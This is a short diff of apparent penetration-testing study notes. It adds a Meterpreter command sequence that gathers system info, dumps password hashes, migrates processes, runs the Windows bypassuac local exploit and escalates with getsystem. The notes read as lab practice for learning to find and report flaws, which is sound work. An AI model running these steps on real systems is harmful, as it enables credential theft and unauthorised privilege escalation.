@@ -1,3 +1,25 @@
 1) Practice msfconsole and vulnerabilities scanner
 
 2) Try fixing and reporting the vulnerabilities
+
+3) meterpreter commands:
+> sysinfo
+> hashdump
+> getuid
+> ps
+> migrate 2176
+> background
+------back--------
+> sessions -l
+> search bypassuac
+> use exploit/windows/local/bypassuac
+> show options
+> set SESSION 2
+> exploit
+-------connection------
+> getuid
+> getsystem
+> getuid
+> hashdump
+
+
